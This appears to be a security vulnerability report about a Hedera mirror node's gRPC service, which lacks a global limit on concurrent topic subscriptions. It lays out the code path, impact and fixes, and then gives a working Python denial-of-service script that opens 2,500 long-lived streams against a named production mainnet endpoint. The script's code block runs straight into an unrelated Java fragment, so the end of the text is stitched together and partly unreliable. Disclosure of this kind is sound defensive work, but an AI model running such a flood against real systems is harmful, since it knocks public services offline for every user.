### Title
Unbounded Global gRPC Subscription Exhaustion via Missing Connection-Level Limit in `CompositeTopicListener.listen()`

### Summary
`CompositeTopicListener.listen()` applies no global concurrent subscription limit. The only server-side guard, `maxConcurrentCallsPerConnection = 5`, is scoped per TCP connection; because no `maxConnections` ceiling is set on the Netty server builder, an unauthenticated attacker can open an arbitrary number of TCP connections and hold 5 long-lived `subscribeTopic` streams on each, exhausting the `Schedulers.boundedElastic()` thread pool used by `PollingTopicListener`, the database connection pool, and process memory.

### Finding Description

**Code path:**

`ConsensusController.subscribeTopic()` → `TopicMessageServiceImpl.subscribeTopic()` → `CompositeTopicListener.listen()` (lines 35–44)

```
// CompositeTopicListener.java:35-44
public Flux<TopicMessage> listen(TopicMessageFilter filter) {
    if (!listenerProperties.isEnabled()) {
        return Flux.empty();
    }
    return getTopicListener()
            .listen(filter)
            .filter(t -> filterMessage(t, filter))
            .doOnNext(this::recordMetric);
}
```

There is no check on the number of active subscriptions before delegating to the underlying listener.

**Root cause — the per-connection guard does not bound global subscriptions:**

`GrpcConfiguration` (lines 28–35) configures the Netty server with only two settings:

```java
serverBuilder.executor(applicationTaskExecutor);
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection()); // = 5
```

`NettyProperties` (line 14) sets `maxConcurrentCallsPerConnection = 5`. No `maxConnections`, `maxConnectionIdle`, or `maxConnectionAge` is set anywhere in the gRPC module. An attacker who opens *N* TCP connections can therefore hold *5N* simultaneous streaming RPCs.

**`subscriberCount` is not enforced:**

`TopicMessageServiceImpl` (lines 48, 89–90) maintains `subscriberCount` only as a Micrometer gauge metric — it is never read back to reject new subscriptions.

**Resource exhaustion vectors with POLL listener type:**

`PollingTopicListener` (lines 31, 38–48) creates a private `Schedulers.boundedElastic()` instance and schedules a repeating poll task per subscription. Reactor's `boundedElastic` scheduler has a bounded thread count (default: 10 × CPU cores) and a bounded task queue (default: 100,000). With thousands of subscriptions each enqueuing periodic tasks, the scheduler saturates and legitimate subscribers are starved or rejected.

Additionally, each poll invocation calls `topicMessageRepository.findByFilter()`, consuming a JDBC connection from the shared HikariCP pool for the duration of the query. With enough concurrent subscriptions the pool is exhausted and all database operations block.

### Impact Explanation

- **Availability — gRPC service DoS:** Saturating `Schedulers.boundedElastic()` prevents any new or existing subscription from receiving messages; the service becomes unresponsive to all clients.
- **Database DoS:** Exhausting the HikariCP connection pool blocks the importer and all other gRPC queries.
- **Memory exhaustion:** Each subscription allocates a `TopicContext`, a `PollingContext`, a reactive pipeline chain, and associated filter objects. Thousands of subscriptions can exhaust heap and trigger OOM.
- **Severity: High** — complete loss of availability for the public gRPC endpoint with no authentication required.

### Likelihood Explanation

The gRPC port (5600) is publicly exposed (Kubernetes ingress is enabled by default in `charts/hedera-mirror-grpc/values.yaml`). No authentication is required to call `subscribeTopic`. A single attacker machine can open thousands of TCP connections and issue 5 streaming RPCs per connection using any standard gRPC client. The attack is trivially repeatable and scriptable. The only friction is network bandwidth to maintain the connections, which is negligible for long-lived idle streams.

### Recommendation

1. **Add a global subscription cap in `CompositeTopicListener.listen()`:** Check `subscriberCount` (already tracked in `TopicMessageServiceImpl`) against a configurable maximum and return `Flux.error(Status.RESOURCE_EXHAUSTED)` when exceeded.
2. **Set `maxConnections` on the Netty server builder** in `GrpcConfiguration` to bound the total number of TCP connections independently of per-connection call limits.
3. **Set `maxConnectionIdle` and `maxConnectionAge`** on the Netty server builder to reclaim resources from idle or long-lived attacker connections.
4. **Add a per-source-IP connection/subscription rate limit** at the ingress or application layer.
5. **Expose `maxConnections` as a configurable property** in `NettyProperties` alongside `maxConcurrentCallsPerConnection`.

### Proof of Concept

```python
import grpc
import threading
from concurrent.futures import ThreadPoolExecutor

# proto-generated stubs assumed available
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from google.protobuf.timestamp_pb2 import Timestamp

TARGET = "mainnet.mirrornode.hedera.com:443"
CONNECTIONS = 500   # 500 TCP connections
CALLS_PER_CONN = 5  # maxConcurrentCallsPerConnection default

def flood(conn_id):
    channel = grpc.secure_channel(TARGET, grpc.ssl_channel_credentials())
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery()
    query.topicID.topicNum = 1          # any existing topic
    query.consensusStartTime.CopyFrom(Timestamp(seconds=0))
    # open 5 long-lived streams on this connection, never read them
    streams = [stub.subscribeTopic(query) for _ in range(CALLS_PER_CONN)]
    # block forever to hold the subscriptions open
    threading.Event().wait()

with ThreadPoolExecutor(max_workers=CONNECTIONS) as pool:
    for i in range(CONNECTIONS):
        pool.submit(flood, i)
# Result: 2500 concurrent subscriptions; PollingTopicListener boundedElastic
# scheduler saturates; DB connection pool exhausted; service unresponsive.

    private final Scheduler scheduler = Schedulers.boundedElastic();

    @Override
    public Flux<TopicMessage> listen(TopicMessageFilter filter) {
        PollingContext context = new PollingContext(filter);
        Duration interval = listenerProperties.getInterval();

        return Flux.defer(() -> poll(context))
                .delaySubscription(interval, scheduler)
                .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                        .jitter(0.1)
                        .withFixedDelay(interval)
                        .withScheduler(scheduler))
                .name(METRIC)
                .tag(METRIC_TAG, "poll")
                .tap(Micrometer.observation(observationRegistry))
                .doOnNext(context::onNext)
                .doOnSubscribe(s -> log.info("Starting to poll every {}ms: {}", interval.toMillis(), filter));
